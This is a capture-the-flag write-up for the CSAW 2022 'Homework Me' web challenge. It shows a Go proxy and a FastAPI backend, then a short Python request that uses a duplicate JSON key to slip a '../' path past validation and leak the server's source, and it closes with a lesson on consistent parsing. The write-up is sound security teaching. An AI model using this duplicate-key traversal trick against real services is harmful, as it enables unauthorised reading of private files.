# Homework Me

## Challenge

Waiting for them to post at <https://github.com/osirislab/CSAW-CTF-2022-Final-WriteUps>...

## Walkthrough

The challenge had an interesting setup with a frontend Go server serving a template filled by making a call to a Python HTTP API. In essence the Go service was acting as a reverse proxy.

Our challenge was to leak the Python script as the flag was embedded within the source.

```py
import os
...
# flag{TESTFLAG}
...
```

The Python HTTP API was under 40 lines making it clear we'd be attacking the `/retrieve` endpoint to get LFI. Unfortunately for us the frontend was doing some filtering to make sure that we couldn't read outside of specific directories.

```py
@app.post("/retrieve")
async def retrieve(file: File):
    file_dict = file.dict()
    file_path = os.path.join(path, file_dict["subject"], file_dict["filename"])
    try:
        return FileResponse(file_path)
    except:
        return "file not found"
```


```go
func retrieveFile(w http.ResponseWriter, r *http.Request) {
	data, err := io.ReadAll(r.Body)
    ...
	check := false

	// check for existing files
	for _, m := range files {
		if (m["filename"] == fn) && (m["subject"] == subject) {
			check = true
		}
	}

	if check {
		bodyReader := bytes.NewReader(data)
		res, err := http.Post(requestURL+"/retrieve", "application/json", bodyReader)
        ...
    } else {
		w.Write([]byte("homework not found :("))
	}
}

```

Seeing that the request body was passed unmodified to the Python backend I tried passing 2 files to the API hoping Go would only validate the first. It worked!

```py
import httpx

r = httpx.post('http://web.chal.csaw.io:5008/homework', data='{"filename":"atom.pdf","subject":"science","filename":"main.py","subject":"../"}')
print(r.status_code, r.text)
```

During the CTF I didn't investigate further but it did get me thinking about how something like this could actually slip into production code. In this case the vulnerability occurs as the JSON library used in Go server finds the first instance of the Key while the fastapi Python library used parses the last instance. Goes to show how important consistency across parsing is.

Of course ideally when writing a service of importance you would pass the validated data to the next endpoint instead of the original request body.

## Solve

`flag{bro_can_i_use_your_chegg}`
